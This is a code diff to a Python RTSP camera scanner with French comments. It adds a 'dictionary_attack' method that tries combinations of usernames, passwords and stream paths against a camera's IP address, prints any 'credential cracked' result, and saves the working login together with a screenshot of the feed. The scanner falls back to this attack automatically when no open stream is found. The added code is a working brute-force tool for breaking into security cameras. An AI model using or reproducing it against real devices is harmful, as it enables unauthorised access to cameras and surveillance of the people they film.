@@ -1,7 +1,7 @@
 import cv2
 import os
 import time
-from rtsp_path import RTSP_local_path
+from rtsp_path import RTSP_local_path, RTSP_user, RTSP_pass
 import sys
 import threading
 
@@ -34,7 +34,7 @@ class rtspFluxScanner:
             if frame is None:
                 print("a stream was lost at: " + rtsp_url)
                 return None
-            self.__rtsp_data_saver(frame, i)
+            self.__rtsp_data_saver(frame, i, "")
             cap.release()
             return 1
         else:
@@ -63,7 +63,7 @@ class rtspFluxScanner:
         return frame
     
     #savegarde les data
-    def __rtsp_data_saver(self, frame, rtsp_path):
+    def __rtsp_data_saver(self, frame, rtsp_path, login):
         screenPath = self._ip + "/" + self._ip + "_" + rtsp_path.replace("/","_") + ".jpg"
         dataPath = self._ip + "/" + self._ip + ".txt"
         if not os.path.exists(self._ip):
@@ -71,7 +71,7 @@ class rtspFluxScanner:
 
         #sauvegarde le path complet dans un fichier texte
         f = open(dataPath, "a")
-        f.write(str(self._ip + "/" + rtsp_path + "\n"))
+        f.write(str(login + self._ip + "/" + rtsp_path + "\n"))
         f.close()
 
         #sauvegarde un screenshot de la camera en jpg
@@ -80,7 +80,29 @@ class rtspFluxScanner:
         print("Stream was on at: " + str(self._ip + rtsp_path))
         print("screen was save at " + screenPath)
 
+    def dictionary_attack(self):
+        print("dictionnary attack")
+        for path in RTSP_local_path:
+            for user in RTSP_user:
+                for _pass in RTSP_pass:
+                    connection_try_url = "rtsp://" + user + ":" + _pass + "@" + self._ip + "/" + path
+                    cap = cv2.VideoCapture(connection_try_url)
+                    if cap.isOpened():
+                        print("credential cracked: " + connection_try_url)
+                        frame = self.__rtsp_flux_reader(cap)
+                        if frame is None:
+                            print("a stream was lost at: " + connection_try_url)
+                            return None
+                        self.__rtsp_data_saver(frame, path, user + ":" + _pass + "@")
+                        cap.release()
+                        return 1
+        return 0
+        
+
+
     #Fonction principale, lance l'execution de la classe
     def Analize(self):
         self.__rtsp_path_finder()
+        if not os.path.exists(self._ip):
+            self.dictionary_attack()
         return 0
